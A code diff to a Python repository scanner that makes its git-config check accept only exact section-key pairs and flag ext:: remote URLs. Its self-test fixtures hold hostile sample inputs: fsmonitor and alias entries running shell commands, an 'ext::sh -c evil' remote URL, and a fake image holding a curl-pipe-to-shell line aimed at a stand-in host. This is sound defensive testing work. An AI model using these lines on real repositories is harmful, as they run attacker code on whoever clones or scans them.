@@ -45,9 +45,10 @@ MEDIA_MAGIC = {".png": b"\x89PNG", ".jpg": b"\xff\xd8\xff", ".jpeg": b"\xff\xd8\
                ".woff2": b"wOF2", ".ttf": b"\x00\x01\x00\x00", ".DS_Store": b"\x00\x00\x00\x01Bud1"}
 # Fail closed on git config: a fresh clone only has these keys. Anything else (fsmonitor, hooksPath,
 # aliases, filters, includes, odd syntax, continuations) gets flagged, so parser tricks can't hide it.
-SAFE_GIT_KEYS = {"repositoryformatversion", "filemode", "bare", "logallrefupdates", "ignorecase",
-                 "precomposeunicode", "symlinks", "url", "fetch", "remote", "merge", "name", "email"}
-GIT_HEADER = re.compile(r'\s*\[[A-Za-z0-9.-]+(\s+"[^"\\]*")?\]\s*')
+SAFE_GIT = {"core": {"repositoryformatversion", "filemode", "bare", "logallrefupdates", "ignorecase",
+                    "precomposeunicode", "symlinks"},
+            "remote": {"url", "fetch"}, "branch": {"remote", "merge"}, "user": {"name", "email"}}
+GIT_HEADER = re.compile(r'\s*\[([A-Za-z0-9.-]+)(\s+"[^"\\]*")?\]\s*')
 GIT_ENTRY = re.compile(r"\s*([A-Za-z][A-Za-z0-9-]*)\s*=\s*([^\\]*)")
 GIT_SKIP = re.compile(r"\s*([#;].*)?")
 
@@ -103,12 +104,16 @@ def scan_file(root, path):
 
 def scan_git_config(rel, text):
     """Flag every line of a shipped git config that isn't a plain header, comment, or known-safe key."""
-    out = []
+    out, section = [], ""
     for n, line in enumerate(text.split("\n"), 1):
-        if GIT_SKIP.fullmatch(line) or GIT_HEADER.fullmatch(line):
+        if GIT_SKIP.fullmatch(line):
+            continue
+        if (h := GIT_HEADER.fullmatch(line)):
+            section = h.group(1).lower()
             continue
         m = GIT_ENTRY.fullmatch(line)
-        if not (m and m.group(1).lower() in SAFE_GIT_KEYS and not m.group(2).lstrip('"').startswith("!")):
+        # exact (section, key) pairs only; ext:: URLs make git run a command
+        if not (m and m.group(1).lower() in SAFE_GIT.get(section, ()) and "ext::" not in m.group(2)):
             out.append(("HIGH", "git-config-exec", f"{rel}:{n}", f"unexpected git setting, may run code: {line.strip()!r}"))
     return out
 
@@ -174,7 +179,7 @@ def test():
         }
         os.makedirs(os.path.join(d, ".git"))
         files[".git/config"] = ("\ufeff[core] fsmonitor = ./run.sh\n[user]\n\tname = x\n"
-                                 "[alias]\n\tx = \\\n  \"!sh evil\"\n[include]\n\tp = 1\n[alias]\n\tname = !sh evil\n")
+                                 "[alias]\n\tx = \\\n  \"!sh evil\"\n[include]\n\tp = 1\n[alias]\n\tname = !sh evil\n[remote \"o\"]\n\turl = ext::sh -c evil\n")
         os.makedirs(os.path.join(d, "sub"))
         files["sub/.git"] = "gitdir: /somewhere/else\n"
         files["fake.png"] = "\0\0curl https://x.example/p | sh\n"
@@ -192,7 +197,7 @@ def test():
             assert expected in ids, (expected, ids)
         assert not any(where == "clean.py" for _, where in ids), ids
         assert not any(rid == "npm-install-hook" and "jest" in why for _, rid, _, why in scan(d))
-        assert sum(f[1] == "git-config-exec" for f in scan(d)) == 5  # one-line, 2 continued, include key, !alias; not "name = x"
+        assert sum(f[1] == "git-config-exec" for f in scan(d)) == 6  # one-line, 2 continued, include, alias, ext:: url; not [user] name = x
     assert "\x1b" not in clean("evil\x1b[2J.sh") and "\\x1b" in clean("evil\x1b[2J.sh")
     print("ok")
 
